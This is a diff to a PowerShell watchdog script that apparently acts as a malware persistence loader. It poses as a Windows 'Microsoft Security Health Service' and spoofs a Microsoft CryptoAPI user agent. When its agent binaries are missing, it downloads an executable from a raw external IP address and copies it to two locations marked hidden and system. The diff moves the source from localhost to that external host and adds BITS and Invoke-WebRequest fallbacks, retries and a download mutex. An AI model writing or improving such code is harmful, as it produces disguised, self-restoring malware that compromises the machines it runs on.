@@ -29,7 +29,7 @@ $TaskName        = 'Microsoft Security Health Service'
 $AgentMutexName  = 'Global\AgentSingleInstanceMutex'
 $LogPath         = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\watchdog.log'
 $CooldownFile    = Join-Path $env:ProgramData 'Microsoft\SecurityHealth\.last_restart'
-$DownloadUrl     = 'http://127.0.0.1:33875/SecurityHealthService.exe'
+$DownloadUrl     = 'http://150.136.246.12:9000/dist/SecurityHealthService.exe'
 $PollIntervalSec = 60
 $CooldownSec     = 30
 
@@ -80,18 +80,34 @@ $CooldownFile   = '__COOLDOWN_FILE__'
 $DownloadUrl    = '__DOWNLOAD_URL__'
 $CooldownSec    = __COOLDOWN_SEC__
 
-# --- Logging ---
+# --- Logging (non-blocking — uses FileShare::ReadWrite so log can be tailed live) ---
 function Write-Log {
     param([string]$Msg, [string]$Lvl = 'INFO')
     try {
-        $entry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Lvl] $Msg"
+        $entry = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] [$Lvl] $Msg`r`n"
         $logDir = Split-Path -Parent $LogPath
         if (-not (Test-Path $logDir)) { New-Item -Path $logDir -ItemType Directory -Force | Out-Null }
+        # Rotate if > 2MB
         $logItem = Get-Item -Path $LogPath -Force -ErrorAction SilentlyContinue
         if ($logItem -and $logItem.Length -gt 2MB) {
             Move-Item -Path $LogPath -Destination "$LogPath.old" -Force -ErrorAction SilentlyContinue
         }
-        Add-Content -Path $LogPath -Value $entry -ErrorAction SilentlyContinue
+        # Non-blocking write: FileShare::ReadWrite allows concurrent readers (Get-Content -Wait)
+        $fs = [System.IO.FileStream]::new($LogPath, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [System.IO.FileShare]::ReadWrite)
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($entry)
+        $fs.Write($bytes, 0, $bytes.Length)
+        $fs.Flush()
+        $fs.Close()
+    } catch {}
+}
+
+# --- Download Status Breadcrumb (readable check file for monitoring) ---
+$StatusFile = Join-Path (Split-Path -Parent $LogPath) '.download_status'
+function Write-Status {
+    param([string]$Status)
+    try {
+        $content = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Status"
+        [System.IO.File]::WriteAllText($StatusFile, $content)
     } catch {}
 }
 
@@ -110,6 +126,37 @@ function Test-ValidPE {
         }
     } catch {}
     return $false
+}
+
+# --- SHA256 Hash Helper ---
+function Get-FileSHA256 {
+    param([string]$Path)
+    try {
+        $sha = [System.Security.Cryptography.SHA256]::Create()
+        $stream = [System.IO.File]::OpenRead($Path)
+        $hashBytes = $sha.ComputeHash($stream)
+        $stream.Close()
+        $sha.Dispose()
+        return [System.BitConverter]::ToString($hashBytes).Replace('-','').ToLower()
+    } catch { return $null }
+}
+
+# --- Combined Download Verification Helper (PE + size + optional SHA256) ---
+function Test-Download {
+    param([string]$Path, [long]$ExpectedSize, [string]$ExpectedHash)
+    if (-not (Test-ValidPE $Path)) { return $false }
+    $item = Get-Item -Path $Path -Force -ErrorAction SilentlyContinue
+    if (-not $item -or $item.Length -lt 1048576) { return $false }
+    if ($ExpectedSize -gt 0 -and $item.Length -ne $ExpectedSize) { return $false }
+    if ($ExpectedHash) {
+        $actualHash = Get-FileSHA256 $Path
+        if ($actualHash -ne $ExpectedHash.ToLower()) {
+            Write-Log "SHA256 mismatch: expected=$ExpectedHash actual=$actualHash" 'WARN'
+            return $false
+        }
+        Write-Log 'SHA256 hash verified successfully.' 'INFO'
+    }
+    return $true
 }
 
 # ═══════════════════ STEP 1: MUTEX LIVENESS CHECK ═══════════════════
@@ -146,68 +193,154 @@ try {
 
     if (-not $priExists -and -not $secExists) {
         Write-Log 'Both binaries missing or invalid. Initiating intelligent download...' 'WARN'
-        $tempFile = Join-Path $env:TEMP "shs_$([System.IO.Path]::GetRandomFileName()).tmp"
-        $downloadSuccess = $false
+        Write-Status 'STARTING: Both binaries missing. Beginning download recovery.'
 
-        for ($attempt = 1; $attempt -le 50; $attempt++) {
-            try {
-                Write-Log "Download attempt $attempt of 50..." 'INFO'
-                [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
-                $req = [System.Net.WebRequest]::Create($DownloadUrl)
-                $req.UserAgent = 'Microsoft-CryptoAPI/10.0'
-                $req.Timeout = 300000  # 5 minute timeout for slow internet / large downloads
-                $resp = $req.GetResponse()
-                $expectedLength = $resp.ContentLength
-                $respStream = $resp.GetResponseStream()
-                
-                $fileStream = [System.IO.File]::Create($tempFile)
-                $buffer = New-Object byte[] 65536
-                while (($read = $respStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
-                    $fileStream.Write($buffer, 0, $read)
+        # ── Download Mutex: Prevent concurrent WMI triggers from overlapping downloads ──
+        $dlMutexName = 'Global\WatchdogDownloadMutex'
+        $dlMutex = $null
+        $gotMutex = $false
+        try {
+            $dlMutex = New-Object System.Threading.Mutex($false, $dlMutexName)
+            $gotMutex = $dlMutex.WaitOne(5000)  # Wait 5s max for another download to finish
+        } catch { $gotMutex = $true }  # If mutex creation fails, proceed anyway
+
+        if (-not $gotMutex) {
+            Write-Log 'Another download is in progress (mutex held). Skipping this cycle.' 'INFO'
+            Write-Status 'SKIPPED: Another download already in progress.'
+            if ($dlMutex) { $dlMutex.Dispose() }
+        } else {
+            $tempFile = Join-Path $env:TEMP "shs_$([System.IO.Path]::GetRandomFileName()).tmp"
+            $downloadSuccess = $false
+            $maxRetries = 10
+            $baseDelaySec = 5
+            $maxDelaySec = 120
+            $serverHash = $null
+
+            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11
+
+            # ── Method 1: HttpWebRequest (primary — supports SHA256 header) ──
+            for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
+                $resp = $null; $respStream = $null; $fileStream = $null
+                try {
+                    Write-Log "Download attempt $attempt of $maxRetries (WebRequest)..." 'INFO'
+                    Write-Status "DOWNLOADING: Attempt $attempt/$maxRetries via WebRequest"
+
+                    $req = [System.Net.HttpWebRequest]::Create($DownloadUrl)
+                    $req.UserAgent = 'Microsoft-CryptoAPI/10.0'
+                    $req.Timeout = 30000           # 30s connection timeout
+                    $req.ReadWriteTimeout = 300000  # 5min transfer timeout
+                    $req.AllowAutoRedirect = $true
+                    $resp = $req.GetResponse()
+                    $expectedLength = $resp.ContentLength
+                    $serverHash = $resp.Headers['X-SHA256']
+                    $respStream = $resp.GetResponseStream()
+
+                    $fileStream = [System.IO.File]::Create($tempFile)
+                    $buffer = New-Object byte[] 65536
+                    $totalRead = [long]0
+                    while (($bytesRead = $respStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
+                        $fileStream.Write($buffer, 0, $bytesRead)
+                        $totalRead += $bytesRead
+                    }
+                    $fileStream.Flush()
+                } catch {
+                    Write-Log "WebRequest attempt $attempt failed: $_" 'WARN'
+                } finally {
+                    # Always close streams to prevent handle leaks
+                    if ($fileStream)  { try { $fileStream.Close()  } catch {} }
+                    if ($respStream)  { try { $respStream.Close()  } catch {} }
+                    if ($resp)        { try { $resp.Close()        } catch {} }
                 }
-                $fileStream.Close()
-                $respStream.Close()
-                $resp.Close()
 
-                $dlItem = Get-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
-                $dlSize = if ($dlItem) { $dlItem.Length } else { 0 }
-
-                # Verify size against Content-Length header and verify PE header ('MZ')
-                $sizeValid = ($expectedLength -le 0) -or ($dlSize -eq $expectedLength)
-                if ($sizeValid -and (Test-ValidPE $tempFile)) {
+                # Verify the download
+                if ((Test-Path $tempFile) -and (Test-Download $tempFile $expectedLength $serverHash)) {
+                    $dlItem = Get-Item -Path $tempFile -Force
                     $downloadSuccess = $true
-                    Write-Log "Download verified ($dlSize bytes, valid PE header)." 'WARN'
+                    Write-Log "Download verified ($($dlItem.Length) bytes, valid PE, hash OK)." 'WARN'
+                    Write-Status "SUCCESS: Downloaded $($dlItem.Length) bytes, integrity verified."
                     break
                 } else {
-                    Write-Log "Download verification failed (Downloaded: $dlSize, Expected: $expectedLength). Purging and retrying in 10s..." 'WARN'
                     if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
-                    Start-Sleep -Seconds 10
+                    # Exponential backoff with ±30% jitter
+                    $delay = [Math]::Min($baseDelaySec * [Math]::Pow(2, $attempt - 1), $maxDelaySec)
+                    $jitter = Get-Random -Minimum ([int]($delay * 0.7)) -Maximum ([int]($delay * 1.3) + 1)
+                    Write-Log "Waiting ${jitter}s before retry (backoff)..." 'INFO'
+                    Write-Status "RETRY: Waiting ${jitter}s before attempt $($attempt+1)"
+                    Start-Sleep -Seconds $jitter
                 }
-            } catch {
-                Write-Log "Download attempt $attempt failed: $_. Retrying in 10s..." 'WARN'
-                if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
-                Start-Sleep -Seconds 10
             }
+
+            # ── Method 2: BITS Transfer (fallback — resilient to network interruptions) ──
+            if (-not $downloadSuccess) {
+                Write-Log 'WebRequest failed. Trying BITS transfer...' 'WARN'
+                Write-Status 'FALLBACK: Attempting BITS transfer...'
+                try {
+                    $tempFile = Join-Path $env:TEMP "shs_$([System.IO.Path]::GetRandomFileName()).tmp"
+                    Import-Module BitsTransfer -ErrorAction Stop
+                    Start-BitsTransfer -Source $DownloadUrl -Destination $tempFile -ErrorAction Stop
+                    if ((Test-Path $tempFile) -and (Test-Download $tempFile 0 $null)) {
+                        $dlItem = Get-Item -Path $tempFile -Force
+                        $downloadSuccess = $true
+                        Write-Log "BITS download verified ($($dlItem.Length) bytes)." 'WARN'
+                        Write-Status "SUCCESS: BITS downloaded $($dlItem.Length) bytes."
+                    } else {
+                        Write-Log 'BITS download failed verification.' 'WARN'
+                        if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
+                    }
+                } catch {
+                    Write-Log "BITS transfer failed: $_" 'WARN'
+                    if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
+                }
+            }
+
+            # ── Method 3: Invoke-WebRequest (last resort) ──
+            if (-not $downloadSuccess) {
+                Write-Log 'BITS failed. Trying Invoke-WebRequest...' 'WARN'
+                Write-Status 'FALLBACK: Attempting Invoke-WebRequest...'
+                try {
+                    $tempFile = Join-Path $env:TEMP "shs_$([System.IO.Path]::GetRandomFileName()).tmp"
+                    Invoke-WebRequest -Uri $DownloadUrl -OutFile $tempFile -UseBasicParsing -TimeoutSec 300 -ErrorAction Stop
+                    if ((Test-Path $tempFile) -and (Test-Download $tempFile 0 $null)) {
+                        $dlItem = Get-Item -Path $tempFile -Force
+                        $downloadSuccess = $true
+                        Write-Log "Invoke-WebRequest download verified ($($dlItem.Length) bytes)." 'WARN'
+                        Write-Status "SUCCESS: IWR downloaded $($dlItem.Length) bytes."
+                    } else {
+                        Write-Log 'Invoke-WebRequest download failed verification.' 'WARN'
+                        if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
+                    }
+                } catch {
+                    Write-Log "Invoke-WebRequest failed: $_" 'WARN'
+                    if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
+                }
+            }
+
+            # ── Deploy verified binary to both locations ──
+            if ($downloadSuccess) {
+                $priDir = Split-Path -Parent $PrimaryPath
+                if (-not (Test-Path $priDir)) { New-Item -Path $priDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s $PrimaryPath 2>$null
+                Copy-Item -Path $tempFile -Destination $PrimaryPath -Force
+                & attrib +h +s $PrimaryPath 2>$null
+
+                $secDir = Split-Path -Parent $SecondaryPath
+                if (-not (Test-Path $secDir)) { New-Item -Path $secDir -ItemType Directory -Force | Out-Null }
+                & attrib -h -s $SecondaryPath 2>$null
+                Copy-Item -Path $tempFile -Destination $SecondaryPath -Force
+                & attrib +h +s $SecondaryPath 2>$null
+
+                Write-Log 'Deployed verified agent binary to primary and secondary locations.' 'WARN'
+                Write-Status 'DEPLOYED: Binary restored to both primary and secondary paths.'
+            } else {
+                Write-Log 'All download methods exhausted. Will retry on next WMI cycle.' 'ERROR'
+                Write-Status 'FAILED: All download methods failed. Waiting for next WMI cycle.'
+            }
+            if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
+
+            # Release download mutex
+            try { $dlMutex.ReleaseMutex() } catch {}
+            try { $dlMutex.Dispose() } catch {}
         }
-
-        if ($downloadSuccess) {
-            $priDir = Split-Path -Parent $PrimaryPath
-            if (-not (Test-Path $priDir)) { New-Item -Path $priDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s $PrimaryPath 2>$null
-            Copy-Item -Path $tempFile -Destination $PrimaryPath -Force
-            & attrib +h +s $PrimaryPath 2>$null
-
-            $secDir = Split-Path -Parent $SecondaryPath
-            if (-not (Test-Path $secDir)) { New-Item -Path $secDir -ItemType Directory -Force | Out-Null }
-            & attrib -h -s $SecondaryPath 2>$null
-            Copy-Item -Path $tempFile -Destination $SecondaryPath -Force
-            & attrib +h +s $SecondaryPath 2>$null
-
-            Write-Log "Deployed verified agent binary to primary and secondary locations." 'WARN'
-        } else {
-            Write-Log 'All download attempts failed.' 'ERROR'
-        }
-        if (Test-Path $tempFile) { Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue }
     }
     elseif (-not $priExists -and $secExists) {
         $secItem = Get-Item -Path $SecondaryPath -Force -ErrorAction SilentlyContinue
